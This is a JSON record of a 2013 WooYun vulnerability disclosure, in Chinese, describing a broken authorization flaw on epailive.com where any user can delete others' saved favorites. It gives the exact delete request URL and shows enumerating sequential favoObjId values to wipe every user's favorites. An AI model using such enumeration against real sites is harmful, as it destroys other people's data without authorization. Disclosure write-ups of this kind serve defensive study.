{"id": 64815, "wybug_id": "wooyun-2013-023763", "wybug_title": "易拍全球删除所有用户收藏的方法", "wybug_corp": "epailive.com", "wybug_author": "小川", "wybug_date": "2013-06-07 11:13", "wybug_open_date": "2013-06-12 11:13", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 其实就是个越权+遍历啦 详细说明：  首先注册两个账户USERA，USERB首先登录USERA，随便收藏个商品如下图：\n\n然后我们截获一下，删除收藏的请求\n\n我们看到删除的请求为http://www.epailive.com/member/favoAction_delAppMemFavo.do?type=1&favoCateId=&orderBy=0&favoObjId=23342不要把请求发送过去，记录下这个favoObjId值为23342刷新下页面，确保没有删除这个收藏，然后USERA可以退出了。然后USERB登场，在浏览器上敲一下这个请求http://www.epailive.com/member/favoAction_delAppMemFavo.do?type=1&favoCateId=&orderBy=0&favoObjId=23342好他的任务完成了，退出吧。然后USERA再登场，查看下我的收藏。收藏品没了，大功告成！\n\n以上是证明了可以越权删除他人的收藏，每个用户收藏一个商品favoObjId就会加1.那么好吧，我们遍历一下：http://www.epailive.com/member/favoAction_delAppMemFavo.do?type=1&favoCateId=&orderBy=0&favoObjId=1http://www.epailive.com/member/favoAction_delAppMemFavo.do?type=1&favoCateId=&orderBy=0&favoObjId=2http://www.epailive.com/member/favoAction_delAppMemFavo.do?type=1&favoCateId=&orderBy=0&favoObjId=3....http://www.epailive.com/member/favoAction_delAppMemFavo.do?type=1&favoCateId=&orderBy=0&favoObjId=23342当然我是孩子，从不淘气......   漏洞证明：  \n\n\n\n\n\n   修复方案：  删除的收藏，准是当前用户的收藏品吗?亲？求礼品，求古董   版权声明：转载请注明来源 小川@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-06-12 11:13 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-13 09:08 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  。。。。。。。。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}